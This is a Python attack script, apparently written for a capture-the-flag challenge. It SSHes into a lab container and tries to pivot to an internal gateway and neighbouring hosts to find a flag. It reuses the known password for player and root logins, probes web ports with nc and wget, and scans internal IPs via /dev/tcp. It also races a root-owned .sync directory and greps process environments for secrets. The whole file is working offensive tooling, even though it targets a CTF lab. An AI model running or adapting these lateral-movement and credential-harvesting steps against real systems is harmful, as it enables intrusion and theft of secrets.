#!/usr/bin/env python3
"""
Nuclear option - SSH tunnel through container to gateway
"""

import paramiko
import time

HOST = "instance.ctf.tdho.st"
PORT = 32881
USERNAME = "player"
PASSWORD = "reyalp"

def main():
    print("[*] NUCLEAR APPROACH")
    
    # Connect to container
    container = paramiko.SSHClient()
    container.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    container.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, timeout=10)
    print("[+] Connected to container")
    
    def exec_cmd(cmd):
        stdin, stdout, stderr = container.exec_command(cmd, timeout=30)
        return stdout.read().decode() + stderr.read().decode()
    
    # Try to SSH from container to gateway using the same password
    gateway = "172.27.0.1"
    
    print(f"\n[*] Attempting direct SSH to {gateway}...")
    
    # Method 1: Try with expect-like behavior
    print("\n[1] Using Python SSH library through container...")
    
    # Create SSH key on container if not exists
    print("  Creating SSH keys...")
    exec_cmd("mkdir -p ~/.ssh; chmod 700 ~/.ssh")
    exec_cmd("ssh-keygen -t rsa -f ~/.ssh/id_rsa -N '' -q 2>/dev/null || true")
    
    # Try to connect to gateway
    attempts = [
        # Try with password (using stdin pipe)
        f"(echo '{PASSWORD}'; sleep 1) | ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 player@{gateway} 'cat /etc/flag.txt' 2>&1",
        f"(echo '{PASSWORD}'; sleep 1) | ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 player@{gateway} 'cat flag.txt' 2>&1",
        f"(echo '{PASSWORD}'; sleep 1) | ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@{gateway} 'cat /etc/flag.txt' 2>&1",
        
        # Try without password (maybe keys work)
        f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o PasswordAuthentication=no player@{gateway} 'cat /etc/flag.txt' 2>&1",
        
        # Try nc to get flag via other services
        f"echo 'GET / HTTP/1.0\r\n\r\n' | nc {gateway} 80 2>&1",
        f"echo 'GET /flag HTTP/1.0\r\n\r\n' | nc {gateway} 80 2>&1",
        f"echo 'GET /flag.txt HTTP/1.0\r\n\r\n' | nc {gateway} 8080 2>&1",
    ]
    
    for i, attempt in enumerate(attempts, 1):
        print(f"\n[{i}] {attempt[:80]}...")
        out = exec_cmd(attempt)
        print(out[:500])
        if "TDHT{" in out:
            print(f"\n🚩🚩🚩 FLAG FOUND: {out}")
            return
    
    # Method 2: Try wget/netcat
    print("\n[2] Trying wget/netcat for web services...")
    for port in [80, 8080, 3000, 5000]:
        out = exec_cmd(f"wget -q -O- http://{gateway}:{port}/ 2>&1 | head -20")
        if out and "404" not in out and len(out) > 10:
            print(f"\n  [Port {port}]")
            print(out[:300])
            if "TDHT{" in out:
                print(f"\n🚩 FLAG: {out}")
                return
    
    # Method 3: Check if sync-loop created anything
    print("\n[3] Checking for sync outputs...")
    
    # List all files modified in last 5 minutes
    out = exec_cmd("find /tmp /opt/mc /home/player -type f -mmin -5 2>/dev/null")
    print(f"Recent files:\n{out}")
    
    for line in out.split('\n'):
        if line.strip():
            content = exec_cmd(f"cat {line.strip()} 2>/dev/null")
            if "TDHT{" in content:
                print(f"\n🚩 FLAG in {line}: {content}")
                return
    
    # Method 4: Try to read from .sync as root via race condition
    print("\n[4] Attempting .sync race condition...")
    
    # Create rapid polling script
    script = """#!/bin/bash
for i in {1..100}; do
    cat /opt/mc/.sync/* 2>/dev/null
    ls -la /opt/mc/.sync/ 2>/dev/null
    sleep 0.1
done
"""
    exec_cmd(f"echo '{script}' > /tmp/poll.sh && chmod +x /tmp/poll.sh")
    out = exec_cmd("/tmp/poll.sh &")
    time.sleep(3)
    out = exec_cmd("cat /tmp/poll_output 2>/dev/null")
    if "TDHT{" in out:
        print(f"\n🚩 FLAG: {out}")
        return
    
    # Method 5: Check environment variables and process info
    print("\n[5] Checking environment...")
    out = exec_cmd("env | grep -i flag")
    if "TDHT{" in out:
        print(f"\n🚩 FLAG in env: {out}")
        return
    
    out = exec_cmd("cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep TDHT")
    if "TDHT{" in out:
        print(f"\n🚩 FLAG in process environ: {out}")
        return
    
    # Method 6: Try alternative container IPs
    print("\n[6] Scanning for other containers...")
    for i in [2, 4, 5, 10, 100]:
        ip = f"172.27.0.{i}"
        # Quick check
        out = exec_cmd(f"timeout 1 bash -c 'echo test >/dev/tcp/{ip}/22' 2>&1 && echo 'FOUND:{ip}'")
        if "FOUND" in out:
            print(f"  Found: {ip}")
            # Try to connect
            out = exec_cmd(f"(echo '{PASSWORD}'; sleep 1) | ssh -o StrictHostKeyChecking=no player@{ip} 'hostname; cat /etc/flag.txt; cat flag.txt' 2>&1")
            print(out[:300])
            if "TDHT{" in out:
                print(f"\n🚩 FLAG: {out}")
                return
    
    print("\n[!] All methods exhausted")
    print("\nKey finding: Gateway at 172.27.0.1:22 is OPEN")
    print("Need: SSH credentials or key from GHCR public image")
    
    container.close()

if __name__ == "__main__":
    main()
